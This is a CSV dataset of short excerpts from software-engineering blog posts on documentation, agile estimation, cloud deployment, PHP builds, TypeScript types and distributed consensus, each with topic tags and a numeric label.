1565,"The dividing line between TRD and TDD can be a bit blurry at times. For example, suppose you are developing a server that communicates via a RESTful API. If the goal is to conform to an already-established and documented API, then the API specification is part of the requirements and should be referenced in the TRD. If, on the other hand, the goal is to develop a brand new API, then the API specification is part of the design and should be described in the TDD. (However, the requirements document still needs to specify what the API is trying to accomplish. )These days, it is common practice to write technical docs in a collaborative document system, such as Google Docs or Confluence; however this is not an absolute requirement. The important thing is that there be a way for your team members to be able to make comments on the document and point out errors and omissions.","['Software Development', 'Software Engineering']",10
1566,"However, there are two perils to watch out for: First, TDDs can quickly become out of date as the system continues to evolve. An engineer using a two-year-old TDD as a reference can waste a lot of time trying to understand why the system doesnt behave as described. Ideally, stale TDDs would be marked as obsolete or superseded; in practice this seldom happens, as teams tend to focus on current rather than past work. (Keeping documentation up to date is a challenge that every engineering team struggles with. )Second, a TDD may not include all of the information needed to interface with the system. A TDD might only cover a set of changes to an already-existing system, in which case you would need to consult earlier documentation (if it exists) to get the whole picture. And a TDD mainly focuses on implementation details, which may be irrelevant to someone who simply wants to invoke an API.","['Software Development', 'Software Engineering']",13
1567,"To test this service locally, set the GOOGLE_APPLICATION_CREDENTIALS environment variable to point to a service account JSON file downloaded from your Firebase project. Then execute the __url__ file of the service: This starts the service on port 8080, and you can try it out by sending a request to http://localhost:8080/fetch. You will see the prices collection getting updated in the Firebase console as a result. The updates will also appear on the Android client app, if it happens to be running at the time. Note that when testing locally, you must manually invoke the /fetch endpoint of the service. The __url__ file only takes effect once deployed to the cloud.","['Firebase', 'Google App Engine', 'Google Cloud Functions', 'Firestore', 'Blockchain']",11
1568,"Even if youre experienced, you will find the chart useful. See where you land and track your progress. Either way, new or experienced, by the end of the chart, consider yourself a fullstack developer. HTML/CSS (1 week+)Start by learning the building blocks of the web. You must learn Hyper Text Markup Language (HTML). Its the syntax that is used to structure a website. Luckily, its one of the quicker technologies on the list to pick up.","['Full Stack Developer', 'Web Development', 'Full Stack', 'Full Stack Development', 'Coding']",19
1569,"HTTP and Client-Server Architecture (2 weeks+)A full-stack developer should know how data is communicated over the World Wide Web. In HTTP, functions follow a request and response pattern. One computer acts as the client. The client uses a web browser to send HTTP requests to a server. The server, which is another computer, responds to the client with resources such as HTML and CSS.","['Full Stack Developer', 'Web Development', 'Full Stack', 'Full Stack Development', 'Coding']",19
1570,"Git (1 week+)Learn Git as soon as possible. Git is a version control system that tracks changes in repositories (software projects). You can think of it as Google Drive on steroids. You can share repositories with others. There are multiple contributors to files. But with Git, you can have branches of the project repository for alternative versions. Commits record exactly when a change to add, update, or remove a file happened. And thats only the beginning of its features (Pro-tip: `git reflog` is a secret weapon)In addition, other software engineers and recruiters will want to see your work on Github.","['Full Stack Developer', 'Web Development', 'Full Stack', 'Full Stack Development', 'Coding']",18
1571,"As youre learning Node.js, youll come across a lot of Mongo DB tutorials. Mongo DB is a No SQL databasean alternative to a relational database system. Beware, it can be tempting to focus solely on Mongo DB. Now, its good to know about the No SQL databases and languages. But dont skip SQL, nor the relational model. Theyre so widely used in the industry.","['Full Stack Developer', 'Web Development', 'Full Stack', 'Full Stack Development', 'Coding']",8
1572,"Master Full-Stack Development | Node, SQL, React, and More Computer Science (5 months+)A fullstack developer should also understand computer science. Yes, the time estimate does seem to suggest that four years in college can be boiled down to five months. Does that mean its pointless to get a CS degree? Of course not, getting a degree in computer science is a great investment. You network with many intelligent individuals. And you will get to explore other engineering topics that may interest you.","['Full Stack Developer', 'Web Development', 'Full Stack', 'Full Stack Development', 'Coding']",2
1573,"Also, its worth mentioning that a Snow Alert UI is actively under a development branch at this time. The Snow Alert UI provides a clean interface to manage the alerts using a Form or SQL editor. To fetch and run the latest version use the following commands: From here, open a browser and navigate to http://<server-running-docker>:8000 and the UI will appear. At the time of this writing the UI is still a work in process, but that means there is plenty of opportunity to contribute to the open source development. Many of the existing SIEM tools that are available can be frustrating, provide noisy detection rates, and are pretty expensive to boot. Snow Alert is an open source solution that is worth checking out if you are looking to create rules to generate high fidelity detections pretty quickly and easily.","['Security Analytics', 'Data', 'Open Source', 'Cloud Computing', 'Snowflake']",11
1574,"My first obstacle with C# was strongly typing a JSON object that includes Pact matchers. I started by constructing my C# object using the dynamic object type, copying each field from the strongly typed object created within the source code to an Expando Object: The size of each JSON response object meant this was a time-consuming task. I missed a few mandatory fields and constructed objects incorrectly. I questioned whether we care if a string field is exactly Wolf or I should just be comparing object types, and applying Postels Law here instead (Postels Law applies to the contract itself but could be applied here too: be liberal in what you accept). This resulted in me using reflection, and sped up the process a little: Pact matchers can be added for each property type using reflection and different object types can be catered for at the same time. It can then be serialised to a JSON response string and finally parsed to a JObject type for parsing: This reduced the arbitrary task to construct the dynamic object and I could construct the C# object in the native language without the hassle.","['Pact', 'Json', 'Dot Net Framework', 'Dotnet Core', 'Testing']",15
1575,"At this point we are ready to use pthreads on a Mac. In the next section we will run through the installation process on Cent OS. Skip ahead to the pthreads section if you do not need further installations! Lets run through installing the dependencies for building PHP on Cent OS first. Install the requirements with the following comamnds: I also needed to install readline on my Cent OS system: If you do not have PHP installed on your Cent OS server, the phpbrew Requirements recommend you install it firstly. I prefer using RPM to install PHP. Do so with the following comamnds: Update the PHP7.2 remi file to enable php7.2. Change enabled=0 to enabled=1 in the [remi-php7.2] block only: Finally, install the following PHP packages using yum: Installing phpbrew is identical to the Mac. For completeness, the installation commands are listed here again: It is worth noting that if you reboot your server you will need to re-inititate phpbrew with phpbrew init and amend bashrc again. You may wish to set up a daemon at boot time to do this automatically after finishing the article.","['PHP', 'Development', 'Programming', 'Software Engineering', 'Web Development']",7
1576,"Now, the build command differs slightly from that of the Mac. On Cent OS, build PHP with: We are now using the +openssl=/usr Variant and and additional-with-libdir=lib64 flag. Because unlike the Mac build, we explicitly need to define the Open SSL location for the PHP build to compile. If not, we will get an error during the build process stating no Open SSL libraries were found. This oversight requires a simple fix, but the issue has been discussed on Github here if you would like to investigate it.","['PHP', 'Development', 'Programming', 'Software Engineering', 'Web Development']",7
1577,If the Incident is having a serious impact on business (Go to the Warridor). The Warridor is a special room that we have in each office for dealing with major production issues; these rooms allow engineering teams to coordinate with remote engineering locations efficiently. Engineers have the capabilities to enter these rooms remotely through a pager-duty bridge. Its called a warridor because it used to be a hallway which would be used as a war-room for significant production incidents.3. Often (but not always) actions that could potentially cause alerts will be announced there.4. Does the alert and your initial investigation indicate a general problem or an issue with a specific service that the relevant team should look into? This is why we have on-call rotations.,"['DevOps', 'Pagerduty', 'Site Reliability', 'Software Engineering']",0
1578,"It goes without saying that the most important aspect of any deployment is what exactly is being deployed. Change Sets do this well All components are listed in one view that can be paged through 200 rows at a time. But what if one of those components or one of its dependents is currently being worked on by someone else? What about when youre actually ready to deploy only to be told Change Set Unavailable? Also, wouldnt it be nice to see the entire who-when-what history of, say, a page layout? Thats where source control comes in. Just like any of the safe & versionable document storage systems were all used to (Share Point, Dropbox), all the work done on any Salesforce org should be immediately available and up-to-date with the customizations and code that other folks are working on.","['Continuous Integration', 'Continuous Delivery', 'DevOps', 'Salesforce', 'CRM']",18
1579,"Here again, a number of tools (such as Selenium) exist to help build these checks, but its important to note that they must reach beyond Apex and Lightning tests, which are not geared towards point-and-click configurations. Nevertheless, even with just a subset of your source covered, the final 3 levels are then within reach:7. Continuous Integration: Run automated tests in one sandbox (commonly called System Integration Testing, or SIT for short) at least daily8. Continuous Integration II (sometimes also called Continuous Delivery): Automate tests and deployments to all sandboxes9. Continuous Deployment: Automate tests and deployments in all sandboxes + production With the Salesforce CLI here to stay and new features being added weekly, consider adding it to the New Years resolutions for your org Those deployment fish will do just fine without you!^ The commands listed are tailored to non-scratch orgs, such as sandboxes or developer orgs, and are slightly simplified for clarity. For complete details, check out this foolproof step-by-step guide and the following Trailhead modules on setting up the Salesforce CLI and Git basics.^ Any resemblance to actual persons or actual events is purely coincidental.","['Continuous Integration', 'Continuous Delivery', 'DevOps', 'Salesforce', 'CRM']",10
1580,"A Behavior Tree (BT) is a mathematical model of plan execution used in computer science, robotics, control systems, and video games. They describe switchings between a finite set of tasks in a modular fashion. Their strength comes from their ability to create very complex tasks composed of simple tasks, without worrying how the simple tasks are implemented. BTs present some similarities to hierarchical state machines with the key difference that the main building block of behavior is a task rather than a state. Its ease of human understanding make BTs less error-prone and very popular in the game developer community. BTs have been shown to generalize several other control architectures.","['Programming', 'Behavior Trees', 'Path Planning', 'Autonomous Driving', 'Self Driving Cars']",5
1581,"In the example below is an example of Selector hierarchy, as a part of my behavioral tree used for the path planning project: Execution: The main goal of this selector is to choose left child (detecting whether we have a car very close before us, and adapt the speed accordingly) or right child (drive normally)This selector will return true if and only if all children return true according to the ordered steps of execution: The car is in second lane (Is Curent Lane condition returns true/false) (If this block return false, then we stop examining the rest of the blocks in this sequence)2. It is safe to switch lane (Safe To Switch Lane condition returns true) (if this block return false, then we stop examining the rest of the blocks in this sequence)3. Successfully perform the switch task (Switch Lane task is successfully executed, returns true)4. Goal achieved Where a sequence is an AND, requiring all children to succeed to return success, a selector will return success if any of its children succeed and not process any further children. It will process the first child, and if it fails will process the second, and if that fails will process the third, until success is reached, at which point it will instantly return success. It will fail if all children fail. This means a selector is analogous with an OR gate, and as a conditional statement can be used to check multiple conditions to see if any one of them is true.","['Programming', 'Behavior Trees', 'Path Planning', 'Autonomous Driving', 'Self Driving Cars']",15
1582,"At my workplace we are heavily using Git Lab CI pipelines to orchestrate infrastructure as code on AWS, so we were looking for a lightweight solution to run simple Git Lab pipelines on AWS. This article will give deep insights into the proof of concept workflow of making the first serverless Git Lab runner work, as well as some general experience of trying out Lambda Layers for the first time. You can find the entire code to this experiment here: __url__ EC2.","['AWS', 'Gitlab', 'Serverless', 'Lambda', 'Golang']",7
1583,"When looking at existing open-source projects that deploy gitlab-runner on AWS, I stumbled upon npalm/terraform-aws-gitlab-runner. This is an awesome terraform module to run gitlab-runner on EC2 spot instances. However, this originally did not support native IAM authentication of builds, as the module is using gitlab runner with the docker+machine executor under the hood. After creating a pull request that enables the configuration of an runners_iam_instance_profile, we can now use this hack to inject IAM credentials of the EC2 instance-profile in the metadata service as environment variables to the runner: While this solution works and is perfect for running heavy application builds cost-efficient on EC2 spot instances, it has a lot of overhead. This solution needs at least two EC2 instances and docker to be able to perform builds, which is a lot of components to manage in each of our AWS accounts, just for running terraform. This is what sparked the idea of running builds completely serverless on lambda.","['AWS', 'Gitlab', 'Serverless', 'Lambda', 'Golang']",7
1584,"Getting started with Lambda Layers is a simple as uploading a zip file with the content you want to share with your functions. The content will then be available in the Lambda execution context within the /opt/ directory. After uploading the gitlab-runner binary to a Lambda Layer and writing a simple golang Lambda function to execute it with the necessary parameters, I experienced the first minor success: When invoking the Lambda function, the builds that were tagged with the Lambda runner, started to execute! While this showed that the connection was working, the initial pre-build step of checking out the git repository was failing. Also there are a lot of confusing id outputs on the screen, but we will get to that later. Apparently the Lambda runtime does not come with git pre-installed, which of course makes sense. As providing Git Lab runner to the function with Lambda Layers worked flawlessly, I attempted to do the same with the git binary. According to the Lambda docs, the runtime is based on the Amazon Linux AMI, so getting a compatible binary was straight forward.","['AWS', 'Gitlab', 'Serverless', 'Lambda', 'Golang']",15
1585,"As the basics were now finally working, the last step was to actually run a terraform job to create an s3 bucket in one of our AWS accounts. Img2lambda came in very handy here again, so adding the terraform binary was straight forward. I also added a simple __url__ file to create the bucket, assigned an IAM role with full s3 access to the lambda function and voila, mission accomplished: At the end this proof of concept was a full success, as all criteria that have been defined upfront, were evaluated successfully. However there are of course still issues that need to be solved. The main problem is triggering the lambda function when a build job requires it. During the proof of concept I manually triggered the lambda function after a build job started. This could be solved by regularly triggering the lambda function via a Cloud Watch schedule, however it would not be very efficient. Ideally the lambda should be triggered from the Git Lab server directly. Another solution would be to implement a Git Lab runner lambda executor, that listens for incoming jobs and then triggers the lambda function. Further possibilities can be evaluated in a future proof of concept.","['AWS', 'Gitlab', 'Serverless', 'Lambda', 'Golang']",7
1586,"This trend was part of the thesis of Product Hunt when we started five years ago. As more people become makers, theres an even greater thirst for community to provide feedback and support them on their journey. [2]Maker communities will become increasingly popular[3] as everyone becomes a maker. So will tools to help makers monetize, find side project buddies, and get the word out. And those creative solutions might be built without writing code. [1] Disclaimer: I invested in Voiceflow. As Ive shared before, Im very interested in tools for makers and creators and looking to invest in the space. If thats you, you can find my contact info here. [2] Were building something new at Product Hunt to support makers, freelancers, remote workers, and side project builders. [3] Of course Product Hunt isnt the only online community supporting makers. Many others have sprout up since our founding. Ill share a blog post on this topic soon.","['Startup', 'Tech', 'Product Hunt']",6
1587,"In Hello World Serving part of my Knative tutorial, I describe these steps in detail but to recap here, this is how a minimal Knative service definition __url__ looks like:run Latest implies that we want to deploy the latest version of our code right away with the specified container and configuration. Deploy the service: At this point, youll see a number of things created. First, a Knative service is created along with its pod. Second, a configuration is created to capture the current configuration of the Knative service. Third, a revision is created as a snapshot of the current configuration. Finally, a route is created to direct traffic to the newly created Knative service: In Knative Serving whenever you change Configuration of the Service, it creates a new Revision which is a point-in-time snapshot of code. It also creates a new Route and the new Revision will start receiving traffic.","['Knative', 'Kubernetes', 'Containers', 'Serverless', 'Open Source']",11
1588,"Now, Ive seen a lot when it comes to Software Estimation. Ive estimated in points, Ive estimated in hours, days even t-shirt sizes. Recently, I was in a meeting where the team debated estimating in points AND hours. So, whats a good techie to do? Youll all be familiar with this situation. A project is in its infancy and the Pointy Haired Bosses (PHB) want to know when the project is going to finish. Well, when I was a Tech Lead reporting to a PHB, if a team member told me that thirteen points remained in the sprint, Id think what does that mean to someone outside the project? As a team member I can hazard a guess that theres a a sizeable chunk of work left? But to anyone not directly involved in the day to day work, it carries very little meaning.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1589,"You see, the thing with points is they dont mean time! They are not a scientific unit used to compare one teams performance to another. Theyre something else entirelyand different organisations draw different conclusions on what they represent. Different teams within organisations are often likely to calculate them differently too. It could be a measure of difficulty with a hint of time, complexity with a smattering of risk or just straight up a guess at a random number which roughly pertains to the size of the task and length of time it might take to deliver. Either way, this number should not be relied upon for anything.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",14
1590,"I had a conversation recently and I genuinely wasnt trying to be pedantic - it went a little like this:** PM referrers to anyone in a planning capacity Timing The timing of this conversation is crucial to its success. This conversation took place when the technical team where blind to what they had to implement. Lets say its a Sprint Planning meeting and by blind I mean, this is likely the first time theyll see some abstract Acceptance Criteria to base their estimate off. There was still a number of unknowns, architecture to be defined, dependencies to be resolved and spikes to be investigated, heck even the UX of the feature was missing in action. So, being asked to estimate or give a rough time frame at this stage of a project, is well, pointless If youll pardon the pun! Only once the problem is universally understood by all team members and sliced into manageable chunks can any semi-accurate estimating begin. Anything beforehand is complete and utter guesswork and carries no real meaning other than a finger in the air type estimate. Which begs the question, why bother? They also represent a commitment, because most people will by default relate them to time even if they dont mean to. Saying something is a 3 point story, this still creates a mental marker that this isnt a big task and shouldnt take the team long. But, what if for that 3 point story ends up taking 3 weeks due to a lot of firefighting, staff holidays and other unplanned work? That estimate was useless and cannot be used as a basis for future comparisons of tasks. If two 3 point stories are in a Sprint and one 3 pointer ends up taking about six hours to deliver because the team discovers its simpler than anticipated and the other takes 10 dayswhich was the right estimate? Now, you could argue that unplanned work and holidays should be factored into the plan to help prevent this kind of situation but the reality is, software development is hard and rarely goes to plan.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1591,"Ive heard a number of people say: Lets be honest, to any PHB the amount of work the team commits to is: to finish what they startedto the point where theres no more major bugs and the software is usable and yields a return on investment. Otherwise, why start in the first place? The thing with all this estimating is It really doesnt matter. The team are going to carry on working on the project regardless, unless the project is canned and then, well, what help were your estimates in the first place? Features will keep on coming regardless of how they get into the Backlog either via PHBs demands, Customer Research, Hackathons etc. There should always be a steady stream of things to work on. What matters is the timely delivery of these features and not overloading the delivery team.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1592,"Collectively, the team walked through the design using the business rules as a guide and were able to see how everything fitted together. We took that design and decided on three things: What was core to the new feature / what needed building firstthe MVP? What was secondary, needs to be added, but not straight away? What bells and whistles could we add later? With those three items decided, we then shifted our focus to try to determine some test cases. The Tester provided significant input here by saying what she would be looking for when the feature landed on her todo pile. The team used her input to determine the following: What scenarios could be tested using tooling & automation? What scenarios remained and needed a human? This led to creation of a handful of automation stories which gave our Tester confidence that if these were all implemented, she didnt have an awful lot left to do. We created approximately six automation tasks and one manual, full end-to-end testing task (this involved systems out of the teams control for automation). Everyone was left feeling confident wed covered all the scenarios. All sad path tests were able to be covered with automation too.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",0
1593,"Each of the aforementioned tasks were individually shippable and took a few hours to implement. By having such small tasks the team felt like they were able to deliver value immediately. There was no talk of estimating: everyone on the team knew that each ticket had been broken down to its smallest releasable unit. The whole feature took less than a week to build and everything we shipped was code-reviewed (with a Developer and Tester) as well as showcased to Stakeholders. The team consisted of five people, one BA, one Designer/Frontend, two Developers and one Tester. We ate two pizzas for lunch every day that week.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1594,"The success of this project was down to the pre-amigos meeting where enough information was brought to the table to determine what needed to be delivered. Too often I see Technical teams left to drive out the details of feature requests made upon them and to provide estimates on criteria that were hastily determined moments prior. Rarely is a consideration for time spent on architecture included in an estimate. Occasionally, testing effort factored into the estimatebut only manual testing effort. Security very rarely makes the cut and Accessibility never gets a mention. Other *ilities too, are consigned to the bin when estimating. All of these things need to be taken into account when delivering new work; we cant just slap a number on it and throw it over the fence to be implemented, box ticked. Teams that do this are missing out on some really great conversations and instead consigning themselves to providing estimates that dont raise suspicion.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",13
1595,"Pro-tip: Dont estimate all your tickets as 1 point or 1 day I saw a team do that once. Acceptance Criteria alone is not enough to bring to the table. Some people prefer visuals, however basic. Some prefer diagrams of architecture or information flows. Perhaps a mind-map, some stats, some customer feedback etc. Most importantly, have a date in mind when something needs to be out of the door. Armed with that, teams can begin to investigate what should be built and in what order and make their own calls as to what makes the MVP. Sometimes, its not possible to bring any of this to the table without the team first doing a spike into potential solutions or technology.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1596,"In todays day and age teams should be focused on acquiring knowledge of your customers needs, meeting those needs and validating your implementation. If youre using Story Points as a way of sizing stories and not having collaborative conversations around architecture, testing etc. I suggest you free yourself of the constraints of estimation and velocity and everything that comes with it by moving to an experimental approach: try something small, validate it, repeat. Getting things in front of your customers early is crucial to staying current.","['Agile', 'Software Estimation', 'Software Development', 'Project Management', 'Scrum']",1
1597,"A while ago I had a pleasure to work on a migration of a big monolithic system to a more fail-safe architecture. One of the important parts of the system was the server-side jobs that were scheduled with Cron. In total there were around 100 commands that were running with a different frequencies. The problem was that now all the system, as well as the Cron jobs, were supposed to run on two load-balanced servers. We had to find a solution not to duplicate the server-side tasks using the new architecture. In the following article I will present the approach we took. I am not saying it is the best one, but it is one of the options that exist and for us it meets all the requirements. Also that is something we havent found documented anywhere so I believe it is interesting to share.","['AWS', 'AWS Lambda', 'PHP', 'Development', 'Nodejs']",10
1598,"We didnt find anything that would be meeting our needs so we decided to build it from the scratch. In our case the system is PHP application based on Yii framework. It is hosted in AWS and as a database it is using Amazon Aurora. All the nodes are talking to the same database, so we knew we can store the job schedule there. Most of the Cron jobs are Yii Commands, some are shell scripts. The described solution is using an AWS Lambda, but can be easily implemented using Azure Cloud Functions or Google Cloud Functions.","['AWS', 'AWS Lambda', 'PHP', 'Development', 'Nodejs']",11
1599,"For each key, we apply a condition. Depending on the result, we set the name as the type or we put never, which is our flag for keys that we dont want to see in the new type. Its a special type, the opposite of any. Nothing can be assigned to it! Look how this code is evaluated: Note: 'id' is not a value, but a more precise version of the string type. Were going to use it later on. Difference between string and 'id' type: At this point, we have done our crucial work! Now we have a new objective: Gather the names of keys that passed our validation. For Sub Type<Person, string>, it would be: 'name' | 'last Name'.","['Programming', 'Typescript', 'Type Safety', 'Advanced Javascript', 'Tutorial']",15
1600,"Where Pick is a built-in mapped type, provided in Type Script since 2.1: Summarizing all steps, we created two types that support our Sub Type implementation: Note: This is only typing system code, can you imagine that making loops and applying if statements might be possible? Some people prefer to have types within one expression. You ask, I provide: Extract only primitive key types from JSON:2. Filter out everything except functions: If you find any other nice use cases, show us in a comment! One interesting scenario is to create Nullable subtype. But because string | null is not assignable to null, it wont work. If you have an idea to solve it, let us know in a comment!2. Run Time filtering Remember that types are erased during compile-time. It does nothing to the actual object. If you would like to filter out an object the same way, you would need to write Java Script code for it.","['Programming', 'Typescript', 'Type Safety', 'Advanced Javascript', 'Tutorial']",15
1601,"Today we learned how condition and mapped types work in practice. But whats more important, weve focused to solve the riddleits easy to combine multiple types within one, but filtering out type from keys you dont need? I like how Type Script is easy to learn yet hard to master. I constantly discover new ways to solve problems that came up in my daily duties. As follow up, I highly recommend reading advanced typing page in the documentation.","['Programming', 'Typescript', 'Type Safety', 'Advanced Javascript', 'Tutorial']",9
1602,"Ever had that kind of conversation and never actually ended up writing the damn thing because some other, higher priority task came along? Everythings agile, moving fast and features get the focus. How can documentation bring value when its quite often considered waste? In our lives we have all come to contact with some form of documentation, let it be technical requirements, API specifications, recipes, board game or furniture assembly manuals. We find them useful and reassuring, even if we will never read them more than once. One of the main points in agile software development is to produce software, not documentation. What happens when things go too extreme, and you end up in a situation where theres no documentation at all or very little of it?","['Agile', 'Documentation', 'Software Development', 'Story']",12
1603,"Documentation can play a huge role. It can affect the developers when they need to return to a project that has been sitting on a shelf for years or onboard a new team member. It can be a significant risk for the client when the product has to be handed over, and they start maintaining it themselves. Without a proper set of minimum viable documentation, it can become more expensive than writing it in the first place. Sadly, when it was the right time to start, priorities laid on different aspects of the development process. Quite often it is the budget that sets the boundaries because the value is not always visible or arrives too late. So how can we make it valuable for everybody without putting a big hole in our budget? There are many projects in our development vault. Some of them well documented, some have a line or two written down in the README file, and some have information laying around in all sorts of communication channels. Writing documentation seemed to be like fighting a monster. Some took up the challenge only to find that it was not that scary. Others decided to let somebody else deal with it. We wanted to make it less intimidating and turn it into a natural part of the process. For that, we had to start from the beginning.","['Agile', 'Documentation', 'Software Development', 'Story']",13
1604,"We first saw places for improvements when we had to onboard a new developer to the team. Our challenge was to find a way to communicate the development process as efficiently as possible and provide a source for the new person to come back to. We created a template for the team members to fill which listed all development related information and workflow of the team. This template helped the initial developers not to miss any vital information and gave the new team member a place to come back to when they needed it. This gave us an excellent testing field for the template to validate the solution. The developers filled the document and carried out the onboarding process for each other. Instantly we could get feedback and revise the template. With a little effort and luck on our side, we already had a solid starting ground.","['Agile', 'Documentation', 'Software Development', 'Story']",0
1605,"From the onboarding template, we found a way to generate a starting point for the projects Read Me. There are many examples of Read Me-s available, but we needed something that was custom made for our companys processes. We started with defining the roles in the development phases. Mapping down all the parties helps to identify common information needed. Once we had them mapped, we also took a more in-depth look into what those parties are interested in. For example, there is no need for the designer to know all the technical constraints, but they are interested in where to find the application and whom to contact when they have questions. As we aimed to keep the information sufficient, but minimal, we filtered out the most critical aspects of those shared values.","['Agile', 'Documentation', 'Software Development', 'Story']",0
1606,"We also needed to find a way to make it easily accessible and updatable. Without having a proper habit of writing documentation or keeping it up to date, it is hard to motivate oneself. We found it most comfortable to include it as part of a development task. Including documentation as part of the definition of done seemed the most effortless. It helps to create a habit and make it a natural part of a tasks lifecycle. It helps to keep the documentation process agile. With little effort, we have a way to keep the information up to date and relevant without producing waste.","['Agile', 'Documentation', 'Software Development', 'Story']",9
1607,"Broadly speaking, there are two types of models to consider when making a distributed system:1) Simple fault-tolerance In a simple fault-tolerant system, we assume that all parts of the system do one of two things: they either follow the protocol exactly or they fail. This type of system should definitely be able to handle nodes going offline or failing. But it doesnt have to worry about nodes exhibiting arbitrary or malicious behavior.2A) Byzantine fault-tolerance A simple fault-tolerant system is not very useful in an uncontrolled environment. In a decentralized system that has nodes controlled by independent actors communicating on the open, permissionless internet, we also need to design for nodes that choose to be malicious or Byzantine. Therefore, in a Byzantine fault-tolerant system, we assume nodes can fail or be malicious.2B) BAR fault-tolerance Despite the fact that most real systems are designed to withstand Byzantine failures, some experts argue that these designs are too general and dont take into account rational failures, wherein nodes can deviate if it is in their self-interest to do so. In other words, nodes can be both honest and dishonest, depending on incentives. If the incentives are high enough, then even the majority of nodes might act dishonestly.",[''],10
1608,"And theres an entirely new family of protocols being developed that go beyond Nakamoto Consensus. ;) But Ill save that for the next poststay tuned! Note: For the purposes of not turning this into a book, I skipped MANY important papers and algorithms. For example, Ben Orrs Common Coin also used probabilistic approaches but was not optimally resilient. Other algorithms like Hash Cash also used Po W but for limiting email spam and denial-of-service attacks. And there are so many more traditional consensus protocols that I left out! I feel the above is good enough to help you get a great grasp on consensus in a traditional setting vs. Nakamoto. See ya in the next post! Special thanks to Zaki Manian for putting up with all my questions on distributed consensus.",[''],6
1609,"Weve started by simply changing how teams are seated. Seating them around their desk clusters seems logical, as they face each other and are close together. However, its noticeable how monitors form a de facto partition down the centre of the cluster and members have to walk around the whole thing to see each others screens. So, weve moved teams into the negative space between the clusters so that they only need to spin their chairs to talk. It has also more than doubled the space they have autonomy over, as they can utilise the space in between clusters. Its early in the experiment but teams are already customising the new space in a variety of ways, holding stand-ups together first thing in the morning, and mobbing on problems at various points during the day.","['Agile', 'Extreme Programming', 'Software Development']",0
1610,"Weve also introduced a dedicated pairing desk. The desk has a single workstation with a standardised set of tools OS, IDE, VCS etcand is set up to facilitate formal pairing. That means driver/navigator pairing with the roles being rotated in some pre-agreed fashion; even if its just to swap every 10 minutes. The desk can be booked like any other meeting space. The crucial thing will be to make sure it becomes a facility people use to craft new work together and not just another retroactive knowledge-sharing tool. Weve experimented with pairing before, this gives us a specific place to do it.","['Agile', 'Extreme Programming', 'Software Development']",0
1611,"Have drinks and snacks available in the room and offer them when you walk in togetheryou dont want a hungry user! You & your prototype should be the most interesting thing in sight to the user. dont have them facing pedestrian traffic outside)As best you can, hide the recording equipment as much as possible, without it seeming weird. (at least not in constant sight)Explain to your participant how the recording will be used and why, you dont want them sitting there wondering about it all throughout the test.2. Optimal arrangement of your recording tools Ideally you want your recording equipment out of constant view, but preferably positioned so that you can see the facial & body expressions on the user. Also, although not mandatory (it really depends on what youre testing), Id advise having a second webcam focused on the users hands / phone. This can be done either with another tripod / cam, or even better with a make-shift user testing camera / sled. Buying one outright is quite expensive (e.g. Mr Tappy) or you can just make your own.","['UX', 'User Research', 'Lean Startup', 'Lean UX', 'Agile']",6
1612,"Since v1.0, a lot has happened in regards to my skills as Android developer. I graduated college and have worked two separate Android development jobs professionally. I think Ive grown quite a bit as developer in that time and Statistexts has been my toy project the entire time. Any time I was interested in a newly popular architectural pattern (which seems like is every few months on Android), I would try it out by by basically rewriting Statistexts. When I learned new things, I would try to incorporate them in order to solidify my knowledge. Ive probably rewritten some of the files dozens of times. Its not the perfect application and doesnt have the worlds best UI but I was working on it and I would be lying if I said I wasnt attached to it.","['Android', 'Android App Development', 'AndroidDev', 'Android Development']",2
1613,"Although things have worked out for Tasker and multiple other developers, Im sure there are those affected that will fall into the same Invalid uses category that I have after years of maintaining their actually profitable applications. They wont be as lucky as me and might actually make a living off of their applications and this will be a big issue for them. Of course, we can list our apps elsewhere such as the Amazon Appstore or even Fdroid if we decided to open source but these platforms have many less users and will be much less profitable. Google has a virtual monopoly on Android application distribution and although it might not be a bad thing per se, it means that at any point Google can change the rules as they see fit. Statistexts has been in the clear for almost 4 years at this point and although the user base is pretty small, the users have seemingly liked the applications features. Now policy updates will force it and many other apps to be delisted.","['Android', 'Android App Development', 'AndroidDev', 'Android Development']",17
1614,"This leads me and others to start asking some questions. Will other permissions be removed later on? Im currently working on a new application for creating notifications. Should I hesitate when adding new features if they will require new permissions? I want to be able to build cool new things using existing permissions and know that they will be safe from this kind of thing in the future, but I think right now thats pretty hard to guarantee.","['Android', 'Android App Development', 'AndroidDev', 'Android Development']",18
1615,"I will be removing Statistexts from the app store in early January, but until then it will remain available on its Google Play page. In the coming months I will decide whether I keep updating it and if I do where I will distribute it. Im also considering open sourcing it since Ive always wanted to try that out. Going forward, Ill continue to worry about what features are safe to add in new apps and the precedent that Googles actions are setting. At least I learned A LOT working on Statistexts over the years and some users found it helpful. Thats about all I could hope for as a developer.","['Android', 'Android App Development', 'AndroidDev', 'Android Development']",6
1616,"A lot of the teams I coach are used to working on gigantic hunks of work. For those teams, a single task might take weeks or months to accomplish. Thats fine if priorities never shift but in an agile environment, priorities tend to move around a lot (Responding to change over following a plan). And when priorities shift, work in progress gets paused or thrown out. Teams should always focus on the most important things. But all of that shelved and tossed work leads to a lot of waste.","['Agile', 'Leadership', 'Software', 'Startup', 'Communication']",1
1617,"Dynamo DB client (driver/cli) does not group the batches into a single command and send it over to Dynamo DB. Instead, the Client sends each request separately over to Dynamo DB. So, even if you group 100 reads into a single batch at the client, Dynamo DB receives 100 individual read requests Considering the above facts, if youre wondering why use batching at all, there are a couple of reasons as to why: Reads/writes in Dynamo DB batches are sent and processed in parallel. This is certainly faster than individual requests sent sequentially and also saves the developer the overhead of managing threadpools and multi-threaded execution While reads and writes in batch operations are similar to individual reads and write, they are not exactly the same. In order to improve performance with large-scale operations, batch reads/writes do not behave exactly in the same way as individual reads/writes would. For example, you cannot specify conditions on an individual put and delete requests with Batch Write Item and Batch Write Item does not return deleted items in the response.","['Dynamodb', 'Cloud', 'NoSQL', 'Performance', 'Reliability']",8
